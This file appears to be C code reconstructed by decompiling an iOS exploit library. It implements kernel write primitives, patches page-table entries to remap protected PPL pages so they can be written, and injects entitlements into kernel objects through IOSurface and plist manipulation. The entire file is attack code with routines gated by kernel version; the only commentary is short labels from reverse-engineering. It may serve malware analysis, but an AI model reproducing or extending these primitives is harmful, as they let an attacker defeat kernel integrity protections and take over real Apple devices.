/*
 * record_0x90000_iosurface_write.c
 * entry5_type0x09.dylib — IOSurface-backed pmap/kwrite helpers
 *
 * sub_15634  (FUN_00015634) — PPLTEXT kwrite dispatcher (older kernels)
 * sub_158a4  (FUN_000158a4) — IOSurface slot-cache kwrite
 * sub_15d30  (FUN_00015d30) — pmap entry patch (kread + kwrite)
 * sub_15e44  (FUN_00015e44) — kwrite with PPLTEXT range check
 * sub_15f28  (FUN_00015f28) — kwrite router (version-gated)
 * sub_16108  (FUN_00016108) — vm_allocate + kread/kwrite loop
 * sub_16258  (FUN_00016258) — sub_3996c wrapper
 * sub_162dc  (FUN_000162dc) — pmap-aware kwrite
 * sub_16400  (FUN_00016400) — kwrite if kobj changed
 * sub_164bc  (FUN_000164bc) — kwrite or kwrite-8 depending on size
 * sub_16560  (FUN_00016560) — IOSurface entitlement plist inject
 *
 * Verified: kaddr threshold checks, slot-cache walk, vm_allocate pattern,
 *           plist parse/inject sequence, pthread spawn for sub_16ccc.
 * Inferred: role labels from call context and data flow.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>

/* ── externs ─────────────────────────────────────────────────────────────── */
/* forward declarations for functions defined later in this file */
static void sub_15f28(long param_1, uint64_t param_2, uint64_t param_3);
static void sub_15d30(long param_1, uint64_t param_2, uint64_t param_3);
static void sub_15e44(long param_1, uint64_t param_2, uint64_t param_3);
static void sub_16258(long param_1, uint64_t param_2);
static void sub_162dc(long param_1, uint64_t param_2, long param_3,
                      uint32_t param_4, uint64_t param_5, uint64_t param_6);
static void sub_164bc(long param_1, uint64_t param_2, void *param_3,
                      int param_4, int param_5);
static void sub_158a4(long param_1, uint64_t param_2, void *param_3,
                      uint32_t param_4, uint64_t param_5);

/* cross-file externs — defined in record_0x90000_misc.c */
extern void sub_169cc(long *param_1);
extern void sub_150e8(long dict1, long dict2);
extern void sub_15afc(long state, long *base_out, int *stride_out);
extern void sub_171a8(long state, uint64_t addr, int val);

extern int   sub_37238(long state, uint32_t mask);
extern int   sub_37344(long state, int slot, long *out);
extern int   sub_373e0(long state, int slot, long val);
extern long  sub_38514(long state, uint32_t *sz);
extern long  sub_38c90(long state, void *sz_ptr);
extern int   sub_2667c(long state, uint64_t addr, uint32_t sz, void *out);
extern int   sub_2b614(long state, uint64_t addr, void *buf, uint32_t sz);
extern int   sub_2b508(long state, uint64_t addr, uint64_t val);
extern int   sub_2a110(long state, uint64_t addr, uint64_t val);
extern int   sub_29ab4(long state, uint64_t addr, void **out);
extern int   sub_22818(long state, uint64_t addr, void *out);
extern void  sub_2c088(long state, void *arg);
extern void  sub_25f7c(long state, uint32_t flags);
extern int   sub_26004(long state, uint32_t a, void *b);
extern long  sub_33638(long state, io_service_t svc);
extern int   sub_3b784(long state, void *fn, void *ctx);
extern void  sub_2e0b0(long state, uint64_t a, void *b, int c);
extern void  sub_3996c(long state, uint64_t a, uint64_t b, uint64_t c);
extern void  sub_23714(long state, uint64_t addr, uint64_t val);
extern void  sub_d960 (long state, uint64_t addr, uint64_t val);
extern void  sub_25d44(void *buf, size_t len, mach_port_t *out);
extern int   sub_14e20(long dict1, long dict2);
extern long  sub_1ad30(void *fn);
extern void  sub_16ccc(long *param_1);
/* sub_158a4/sub_15d30/sub_15e44/sub_15f28 defined below (static) */

/* ── sub_15634 — PPLTEXT kwrite dispatcher (older kernels) ──────────────── */
void sub_15634(long param_1, uint64_t param_2, long param_3, uint32_t param_4)
{
    if (!sub_37238(param_1, 0x5184001)) return;
    if (!param_2 || !param_3 || !(int)param_4) return;

    if (*(uint64_t *)(param_1 + 0x158) >= 0x1f530000000000ULL) {
        sub_158a4(param_1, param_2, (void *)param_3, param_4, 0);
        return;
    }

    long ppl_base = 0; int stride = 0;
    sub_15afc(param_1, &ppl_base, &stride);
    if (!ppl_base) return;
    if ((uint64_t)ppl_base > param_2) return;
    if (param_2 + param_4 > (uint64_t)(ppl_base + stride)) return;

    long slot_ptr = 0;
    if (!sub_37344(param_1, 3, &slot_ptr)) return;

    if (!slot_ptr) {
        uint32_t sz = (uint32_t)stride + 8;
        uint32_t page = *(uint32_t *)(param_1 + 0x180);
        if ((uint32_t)stride < 0x8c001 &&
            *(uint64_t *)(param_1 + 0x158) + 0xffe7f6f5f8700000ULL < 0xf78900000ULL)
            sz = 0x8c008;
        uint32_t rem = sz % page;
        if (rem) sz += page - rem;
        slot_ptr = sub_38c90(param_1, &sz);
        if (!slot_ptr) return;
        if (!sub_373e0(param_1, 3, slot_ptr)) return;
    }

    uint64_t mask = *(uint64_t *)(param_1 + 0x188);
    uint32_t page = *(uint32_t *)(param_1 + 0x180);
    uint64_t end  = param_2 + param_4 - 1;

    for (uint64_t pg = param_2 & ~mask; pg <= (end & ~mask); pg += page) {
        uint64_t bitmap = 0;
        if (!sub_2667c(param_1, slot_ptr + stride, 8, &bitmap)) return;
        uint64_t bit = (uint64_t)1 << ((pg - ppl_base) >> 14 & 0x1f);
        if (!(bitmap & bit)) {
                sub_15d30(param_1, (uint64_t)(slot_ptr + (pg - ppl_base)), pg);
            bitmap |= bit;
            if (!sub_2b614(param_1, slot_ptr + stride, &bitmap, 8)) return;
        }
    }
    sub_2b614(param_1, slot_ptr + (param_2 - ppl_base), (void *)param_3, param_4);
}

/* ── sub_158a4 — IOSurface slot-cache kwrite ────────────────────────────── */
static void sub_158a4(long param_1, uint64_t param_2, void *param_3,
               uint32_t param_4, uint64_t param_5)
{
    if (sub_26004(param_1, 5, (void *)0x2710)) return;

    uint64_t mask  = *(uint64_t *)(param_1 + 0x188);
    uint64_t pg    = param_2 & ~mask;
    uint64_t end_pg = (param_2 + param_4 - 1) & ~mask;
    if (pg != end_pg) goto unlock;

    uint32_t slots = (*(uint64_t *)(param_1 + 0x158) < 0x1f530000000000ULL) ? 0x10 : 0x100;

    /* walk slot cache at state+0x870 */
    uint64_t *cache = (uint64_t *)(param_1 + 0x870);
    long kobj = 0;
    for (uint32_t i = 0; i < slots; i++) {
        if (!cache[2*i+1]) break;
        if (cache[2*i+1] == pg && cache[2*i]) { kobj = (long)cache[2*i]; goto found; }
    }

    /* allocate new slot */
    {
        long slot_ptr = 0;
        if (!sub_37344(param_1, 7, &slot_ptr)) goto unlock;
        if (!slot_ptr) {
            uint32_t sz = slots << 4;
            slot_ptr = sub_38c90(param_1, &sz);
            if (!slot_ptr || !sub_373e0(param_1, 7, slot_ptr)) goto unlock;
            memset((void *)(param_1 + 0x870), 0, (uint64_t)slots << 4);
        } else {
            if (!sub_2667c(param_1, slot_ptr, slots << 4, (void *)(param_1 + 0x870)))
                goto unlock;
        }
        /* find empty slot */
        for (uint32_t i = 0; i < slots; i++) {
            if (!cache[2*i+1]) {
                uint32_t page_sz = *(uint32_t *)(param_1 + 0x180);
                kobj = sub_38514(param_1, &page_sz);
                if (!kobj || page_sz != *(uint32_t *)(param_1 + 0x180)) goto unlock;
                sub_15d30(param_1, kobj, pg);
                cache[2*i+1] = pg;
                cache[2*i]   = (uint64_t)kobj;
                sub_2b614(param_1, slot_ptr + (long)(i * 16),
                           &cache[2*i], 0x10);
                goto found;
            }
            if (cache[2*i+1] == pg && cache[2*i]) { kobj = (long)cache[2*i]; goto found; }
        }
        goto unlock;
    }

found:
    sub_164bc(param_1, param_2, param_3, (int)param_4, (int)param_5);
unlock:
    sub_25f7c(param_1, 5);
}

/* ── sub_15d30 — pmap entry patch ───────────────────────────────────────── */
static void sub_15d30(long param_1, uint64_t param_2, uint64_t param_3)
{
    uint64_t pte_a[8] = {0}, pte_b[8] = {0};
    if (!sub_22818(param_1, param_3, pte_a)) return;
    if (((uint8_t *)pte_a)[0x28] != 3) return;
    if (!sub_22818(param_1, param_2, pte_b)) return;
    if (((uint8_t *)pte_b)[0xc] != 3) return;

    uint64_t new_pte = (pte_b[0] & 0xffff000000003fffULL) |
                       (pte_a[0] & 0x0000ffffffffc000ULL);
    if ((int)new_pte != (int)pte_b[0]) {
        sub_15f28(param_1, param_2, new_pte);
    }
    if (pte_b[0] >> 32 != new_pte >> 32) {
        sub_15f28(param_1, param_2 + 4, new_pte >> 32);
    }
    sub_2c088(param_1, (void *)0x2710);
}

/* ── sub_15e44 — kwrite with PPLTEXT range check ────────────────────────── */
static void sub_15e44(long param_1, uint64_t param_2, uint64_t param_3)
{
    if (!sub_37238(param_1, 0x5184001)) return;

    if (*(uint64_t *)(param_1 + 0x158) < 0x1f530000000000ULL) {
        long base = 0; int stride = 0;
        sub_15afc(param_1, &base, &stride);
        if (base && (uint64_t)base <= param_2 && param_2 + 4 <= (uint64_t)(base + stride)) {
            sub_15634(param_1, param_2, (long)&param_3, 4);
            return;
        }
    }
    sub_15f28(param_1, param_2, param_3);
}

/* ── sub_15f28 — kwrite router (version-gated) ───────────────────────────── */
static void sub_15f28(long param_1, uint64_t param_2, uint64_t param_3)
{
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
    int      xnu   = *(int *)(param_1 + 0x140);

    if ((sub_37238(param_1, 0x5184000) &&
         (kaddr > 0x2712000c6fffffULL ||
          (kaddr > 0x225c23800fffffULL && xnu < 0x2712))) ||
        (sub_37238(param_1, 0x5100000) &&
         (kaddr > 0x271200073fffffULL ||
          (kaddr > 0x225c1e804fffffULL && xnu < 0x2712)))) {
        sub_171a8(param_1, param_2, (int)param_3);
        return;
    }

    if (sub_37238(param_1, 0x5184000)) {
        if (kaddr >= 0x2712000c700000ULL) {
            if (kaddr <= 0x27120a807fffffULL)
                sub_d960(param_1, param_2, param_3);
            return;
        }
        if (kaddr > 0x225c2380100000ULL && xnu <= 0x2711) {
            sub_d960(param_1, param_2, param_3);
            return;
        }
    }

    if (sub_37238(param_1, 0x5100000)) {
        if (kaddr > 0x271200073fffffULL) goto use_23714;
        if (kaddr > 0x225c1e804fffffULL && xnu < 0x2712) goto use_23714;
    }
    sub_23714(param_1, param_2, param_3);
    return;
use_23714:
    sub_23714(param_1, param_2, param_3);
}

/* ── sub_16108 — vm_allocate + kread/kwrite loop ────────────────────────── */
void sub_16108(long param_1, long param_2, long param_3, uint32_t param_4)
{
    void *tmp = NULL;
    if (vm_allocate(mach_task_self(), (vm_address_t *)&tmp,
                    *(uint32_t *)(param_1 + 0x180), VM_FLAGS_ANYWHERE) != 0)
        return;

    sub_16258(param_1, (uint64_t)param_2);
    uint64_t flags = 0;
    uint32_t done  = 0;

    while (done < param_4) {
        long     cur  = param_2 + done;
        uint32_t page = *(uint32_t *)(param_1 + 0x180);
        uint32_t off  = (uint32_t)cur & *(uint32_t *)(param_1 + 0x188);
        uint32_t chunk = page - off;
        if (param_4 - done < chunk) chunk = param_4 - done;

        if (!sub_2667c(param_1, (uint64_t)cur, chunk, tmp)) break;
        if (memcmp(tmp, (void *)(param_3 + done), chunk) != 0) {
            sub_162dc(param_1, (uint64_t)cur, param_3 + done,
                      chunk, 0, 0);
        }
        done += chunk;
    }

    vm_deallocate(mach_task_self(), (vm_address_t)tmp,
                  *(uint32_t *)(param_1 + 0x180));
}

/* ── sub_16258 — sub_3996c wrapper ──────────────────────────────────────── */
static void sub_16258(long param_1, uint64_t param_2)
{
    sub_3996c(param_1, param_2, 0, param_2);
}

/* ── sub_162dc — pmap-aware kwrite ──────────────────────────────────────── */
static void sub_162dc(long param_1, uint64_t param_2, long param_3,
               uint32_t param_4, uint64_t param_5, uint64_t param_6)
{
    if (!param_2 || !param_3 || !(int)param_4) return;
    uint64_t mask = *(uint64_t *)(param_1 + 0x188);
    uint64_t pg   = param_2 & ~mask;
    if (pg != ((param_2 + param_4 - 1) & ~mask)) return;

    if (!(param_5 & 1)) {
        uint64_t pte[4] = {0};
        if (!sub_22818(param_1, pg, pte)) return;
        if ((((uint8_t *)pte)[0xc] | 2) != 3) return;
        if (((uint8_t *)pte)[0xc] >> 7 & 1) {
            uint32_t flags = *(uint32_t *)((uint8_t *)pte + 0xc) & ~0x80u;
            sub_15e44(param_1, pte[0], flags);
            sub_2c088(param_1, (void *)0x2710);
        }
        sub_164bc(param_1, param_2, (void *)param_3, (int)param_4, (int)param_6);
    } else {
        sub_158a4(param_1, param_2, (void *)param_3, param_4, param_6);
    }
}

/* ── sub_16400 — kwrite if kobj changed ─────────────────────────────────── */
void sub_16400(long param_1, uint64_t param_2, long param_3)
{
    if (!sub_37238(param_1, 0x5184001)) return;
    void *cur = NULL;
    if (!sub_29ab4(param_1, param_2, &cur)) return;
    if ((long)cur == param_3) return;
    sub_16258(param_1, param_2);
    long val = param_3;
    sub_162dc(param_1, param_2, (long)&val,
              *(uint32_t *)(param_1 + 0x168), 0, 1);
}

/* ── sub_164bc — kwrite or kwrite-8 depending on size ───────────────────── */
static void sub_164bc(long param_1, uint64_t param_2, void *param_3,
               int param_4, int param_5)
{
    if (param_5 == 0 || *(int *)(param_1 + 0x168) != param_4) {
        sub_2b614(param_1, param_2, param_3, (uint32_t)param_4);
    } else {
        uint64_t tmp = 0;
        memcpy(&tmp, param_3, (size_t)param_4 > 8 ? 8 : (size_t)param_4);
        sub_2b508(param_1, param_2, tmp);
    }
}

/* ── sub_16560 — IOSurface entitlement plist inject ─────────────────────── */
/*
 * Parses param_3 as a plist, merges it into the IOSurface entitlement dict,
 * then either injects directly (older kernels) or spawns sub_16ccc on a thread.
 */
void sub_16560(long *param_1, uint64_t param_2, char *param_3)
{
    if (*(uint64_t *)(param_1 + 0x56) > 0x1f52ffffffffffffULL) {
        sub_2e0b0((long)param_1, param_2, param_3, 1);
        return;
    }
    if (sub_26004((long)param_1, 0, (void *)0x2710)) return;

    long ctx[8] = {0};
    ctx[0] = (long)param_1;
    ctx[1] = (long)(param_2 & 0xffffffff);
    long dict_out = 0;
    ctx[2] = (long)&dict_out;

    if (!sub_3b784((long)param_1, (void *)(uintptr_t)sub_1ad30((void *)sub_169cc), ctx)) return;
    if (!ctx[3]) return;  /* sub_169cc sets ctx[3]=1 on success */

    size_t plen = strlen(param_3);
    CFDataRef raw = CFDataCreateWithBytesNoCopy(kCFAllocatorDefault,
                        (const UInt8 *)param_3, (CFIndex)(plen + 1),
                        kCFAllocatorNull);
    if (!raw) return;

    CFPropertyListRef plist = CFPropertyListCreateWithData(
        kCFAllocatorDefault, raw, 0, NULL, NULL);
    CFRelease(raw);
    if (!plist) return;

    sub_150e8(dict_out, (long)plist);
    if (!sub_14e20(dict_out, (long)plist)) goto rel_plist;

    uint32_t xnu = *(uint32_t *)((uint8_t *)param_1 + 0x140);
    if (*(uint64_t *)(param_1 + 0x56) < 0x1c1b0a80100000ULL ||
        !(*param_1 & 0x5584001)) {
        /* older path: serialize and inject directly */
        CFDataRef serial = CFPropertyListCreateData(kCFAllocatorDefault,
                               (CFPropertyListRef)dict_out,
                               kCFPropertyListXMLFormat_v1_0, 0, NULL);
        if (!serial) goto rel_plist;
        CFIndex slen = CFDataGetLength(serial);
        char *buf = calloc((size_t)slen + 1, 1);
        if (buf) {
            memcpy(buf, CFDataGetBytePtr(serial), (size_t)slen);
            mach_port_t port = MACH_PORT_NULL, port2 = MACH_PORT_NULL;
            sub_25d44(buf, (size_t)slen + 1, &port);
            if (port + 1 >= 2) {
                if ((xnu - 0x1f53u < 2 || xnu == 0x1c1b || xnu == 0x1809)) {
                    long kobj = sub_33638((long)param_1, port);
                    if (kobj) {
                        void *p1 = NULL, *p2 = NULL;
                        if (sub_29ab4((long)param_1, kobj + 0x10, &p1) &&
                            sub_29ab4((long)param_1, kobj + 0x18, &p2)) {
                            if (sub_29ab4((long)param_1,
                                          *(long *)((uint8_t *)param_1 + 0x390) + 0x88, &p2)) {
                                if (sub_2b508((long)param_1, kobj + 0x10, (uint64_t)(uintptr_t)p2)) {
                                    uint64_t tmp[5] = {0};
                                    if (sub_2667c((long)param_1, kobj, 0x28, tmp)) {
                                        uint32_t off = *(uint32_t *)((uint8_t *)param_1 + 0x168);
                                        sub_2b614((long)param_1,
                                                  *(long *)((uint8_t *)param_1 + 0xe4) + off,
                                                  (uint8_t *)tmp + off, 0x28 - off);
                                    }
                                }
                            }
                        }
                    }
                }
                mach_port_deallocate(mach_task_self(), port);
            }
            if (port2 + 1 >= 2) mach_port_deallocate(mach_task_self(), port2);
            free(buf);
        }
        CFRelease(serial);
    } else {
        /* newer path: spawn sub_16ccc on a detached thread */
        long *tctx = malloc(4 * sizeof(long));
        if (!tctx) goto rel_plist;
        tctx[0] = (long)param_1;
        tctx[1] = (long)dict_out;
        tctx[2] = (long)param_2;
        tctx[3] = 0x1001;

        pthread_attr_t attr;
        pthread_t tid;
        if (pthread_attr_init(&attr) == 0) {
            pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
            void *(*fn)(void *) = (void *(*)(void *))(uintptr_t)
                sub_1ad30((void *)sub_16ccc);
            pthread_create(&tid, &attr, fn, tctx);
            pthread_attr_destroy(&attr);
        } else {
            free(tctx);
        }
    }

rel_plist:
    CFRelease(plist);
}

/* forward declarations needed by sub_16560 — defined in record_0x90000_misc.c */
/* (already declared at top of file) */
